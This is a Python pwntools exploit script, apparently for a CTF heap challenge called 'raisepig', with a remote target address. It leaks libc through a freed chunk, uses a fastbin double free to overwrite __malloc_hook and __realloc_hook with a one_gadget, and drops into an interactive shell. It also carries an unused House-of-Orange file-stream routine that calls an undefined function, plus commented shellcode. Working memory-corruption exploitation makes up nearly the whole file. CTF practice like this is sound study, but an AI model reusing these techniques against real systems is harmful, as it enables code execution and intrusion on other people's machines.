'''http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden
'''
#coding=utf8
from pwn import *
from LibcSearcher import *
from FILE import *
context.log_level = 'debug'
#context(os='linux', arch='i386', log_level='debug')
#shellcode_amd64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#shellcode_i386 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
#context(os='linux', arch='amd64')
#shellcode = asm(shellcraft.sh())

elf = ELF('./raisepig')
local = 1
if local:
	p = process('./raisepig')
#  p=process(['./babyheap'],env={'LD_PRELOAD':'./libc.so.6'},aslr='FALSE')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	p = remote('120.132.85.170', 13579)
	libc = ELF('./libc.so.6')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

#system_plt = elf.plt['system']
#print 'system_plt= ' + hex(system_plt)
#free_got = elf.got['free']
#print 'free_got= ' + hex(free_got)
#puts_plt = elf.plt['puts']
#print 'puts_plt= ' + hex(puts_plt)
#puts_got = elf.got['puts']
#print 'puts_got= ' + hex(puts_got)
#got0= elf.get_section_by_name('.got.plt').header.sh_addr
#print 'got0= ' + hex(got0)
#fake_chunk = got0 + 2 - 8
#print 'fake_chunk= ' + hex(fake_chunk)
#chunklist=0x602140

one_gadget_offset1 = 0x45216
one_gadget_offset2 = 0x4526a
one_gadget_offset3 = 0xf02a4
one_gadget_offset4 = 0xf1147

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()

is_blind=False    
def ru(x):
  if is_blind:
    sleep(0.5)
  else:
    return p.recvuntil(x)

def add(size, content, attack=False):
  ru('Your choice : ')
  p.sendline('1')
  if attack:
    return
  p.recvuntil('Length of the name :')
  p.sendline(str(size))
  p.recvuntil('The name of pig :')
  p.send(content)
  p.recvuntil('The type of the pig :')
  p.sendline('t')

def show():
  p.recvuntil('Your choice : ')
  p.sendline('2')

def delete(idx):
  p.recvuntil('Your choice : ')
  p.sendline('3')
  p.recvuntil('Which pig do you want to eat:')
  p.sendline(str(idx))

#https://xz.aliyun.com/t/2411
def possible_IO_str_jumps_offset():
  IO_file_jumps_offset = libc.sym['_IO_file_jumps']
  IO_str_underflow_offset = libc.sym['_IO_str_underflow']
  for ref_offset in libc.search(p64(IO_str_underflow_offset)):
      possible_IO_str_jumps_offset = ref_offset - 0x20
      if possible_IO_str_jumps_offset > IO_file_jumps_offset:
          success('possible_IO_str_jumps_offset:'+hex(possible_IO_str_jumps_offset))
          return possible_IO_str_jumps_offset
          
def orange():
  pay = 'b'*16 + p64(0) + p64(0xfe1)
  #z()
  create(16,pay)
  pay = '%13$p'
  create(0xfff,pay)

  data = show()
  start_main = int(data, 16)
  libc_base = start_main - (libc.symbols['__libc_start_main'] + 240)
  print 'libc_base= ' + hex(libc_base)

  _IO_list_all = libc_base + libc.symbols['_IO_list_all']
  success('_IO_list_all:'+hex(_IO_list_all))
  #_IO_str_jumps = libc_base + libc.symbols['_IO_str_jumps']
  _IO_str_jumps = libc_base + possible_IO_str_jumps_offset()
  #_IO_str_jumps = libc_base + libc.symbols['_IO_file_jumps'] + 0xc0 #if NO _IO_str_jumps export, _IO_str_jumps - _IO_file_jumps = 0xc0
  success('_IO_str_jumps:'+hex(_IO_str_jumps))
  system = libc_base +libc.symbols['system']
  binsh = libc_base + libc.search('/bin/sh\x00').next()

  success('system:'+hex(system))
  success('binsh:'+hex(binsh))

  pay = 'A'*0x200 #could be 0x10 at least
  #from FILE import *
  context.arch = 'amd64'
  fake_file = IO_FILE_plus_struct()
  fake_file._flags = 0
  fake_file._IO_read_ptr = 0x61
  fake_file._IO_read_base =_IO_list_all-0x10
  fake_file._IO_buf_base = binsh
  fake_file._mode = 0
  fake_file._IO_write_base = 0
  fake_file._IO_write_ptr = 1
  fake_file.vtable = _IO_str_jumps-8
  pay+=str(fake_file).ljust(0xe8,'\x00')+p64(system)
  create(0x200,pay)

  # triger OVERFLOW
  p.sendline('1')
  p.sendline('0x60')
  
def exp():
  add(0x80, '0')
  add(0x60, '1')
  add(0x60, '2')
  add(0x60, '3')
  delete(0)
  add(0x50, 'a'*8) #4, 0x90 - 0x30(header)
  show()
  p.recvuntil('a'*8)
  data = p.recvuntil('\n', drop=True)
  main_arena = u64(data.ljust(8,'\0'))
  print 'main_arena= ' + hex(main_arena)
  libc_base = main_arena - 88 - 0x3C4B20;
  print 'libc_base= ' + hex(libc_base)
  
  '''
  __realloc_hook 00000000003c4b08
  __malloc_hook  00000000003c4b10
  '''
  malloc_hook = libc_base + libc.symbols['__malloc_hook']
  print 'malloc_hook= ' + hex(malloc_hook)
  libc_realloc = libc_base + libc.symbols['__libc_realloc']
  print 'libc_realloc= ' + hex(libc_realloc) #default libc_realloc
  free_hook = libc_base + libc.symbols['__free_hook']
  print 'free_hook= ' + hex(free_hook)
  one_gadget = libc_base + one_gadget_offset3 #2 and 3 satisfy
  print 'one_gadget= ' + hex(one_gadget)

  delete(1)
  delete(2)
  delete(1) #fastbin: 1->2->1
  
  add(0x60, p64(malloc_hook - 0x23)) #5 = 1, set fd = malloc_hook - 0x13
  add(0x60, '6')
  add(0x60, '7') #7 = 1
  pay = '8' * 0xb
  pay += p64(one_gadget) #set __realloc_hook = one_gadget
  pay += p64(libc_realloc + 0x10)
  add(0x60, pay)
  #z()
  add(0x10, '9', True) #double free to invoke one_gadget
  
#  libc = LibcSearcher('printf', printf_addr)
#  libc_base = printf_addr - libc.dump('printf')
#  system_addr = libc_base + libc.dump('system')
#  binsh_addr = libc_base + libc.dump('str_bin_sh')
  
  p.interactive()
  
if __name__ == '__main__':
  exp()